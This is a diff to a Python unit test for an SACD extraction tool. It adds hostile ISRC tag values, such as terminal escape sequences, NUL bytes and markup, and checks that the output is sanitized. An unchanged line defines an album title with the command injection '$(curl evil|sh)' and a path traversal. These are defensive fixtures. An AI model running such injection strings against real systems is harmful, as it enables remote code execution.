@@ -40,6 +40,8 @@ HOSTILE = [
     "\x9b31mC1 CSI",
 ]
 ALBUM = "$(curl evil|sh) \x1b[31m\n../../x"
+# ISRC fields as stored, which sacd_extract-compatible output writes with their spaces (#175)
+HOSTILE_ISRCS = ["\x1b[2J\x07ABC2500", "JP\0BC\r\n25001", "\x01" * 12, 'XX"<a>&\x7fYS26', "\x1b]0;t\x07" + " " * 6, "\x9b31m" + " " * 8]
 
 
 def _latin1(t: str) -> bool:
@@ -107,7 +109,8 @@ class HostileDisc(unittest.TestCase):
         self.root = Path(self.tmp.name)
         frame = bytes([0x69]) * (4704 * 2)          # DSD silence, 2 channels
         frames = [frame] * (10 * len(DISC_TITLES))
-        area = sacdgen.AreaSpec(2, frames, [10] * len(DISC_TITLES), dst=False, titles=DISC_TITLES)
+        area = sacdgen.AreaSpec(2, frames, [10] * len(DISC_TITLES), dst=False, titles=DISC_TITLES,
+                                isrcs=[HOSTILE_ISRCS[i % len(HOSTILE_ISRCS)] for i in range(len(DISC_TITLES))])
         self.iso = self.root / "hostile.iso"
         sacdgen.build_iso(self.iso, [area], title=ALBUM)
         self.out = self.root / "out"
@@ -152,6 +155,13 @@ class HostileDisc(unittest.TestCase):
         for x in [p for p in files if p.suffix == ".xml"]:
             ET.parse(x)                                 # well-formed, no injected markup
             self.assertFalse(re.search(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", x.read_text(errors="replace")))
+        from pysacd import tagging
+        dsf = [p for p in files if p.suffix == ".dsf"]
+        self.assertTrue(dsf)
+        for f in dsf:
+            isrc = tagging.read_tags(f)["ISRC"][0]      # TSRC, as stored up to the first NUL
+            self.assertEqual(len(isrc), len(isrc.split("\0")[0]))
+            self.assertFalse(re.search(r"[\x00-\x1f\x7f-\x9f]", isrc), repr(isrc))
 
     def test_collision_warnings_are_escaped(self):
         # #16: a second, different disc rendering into the same directory gets a warning that
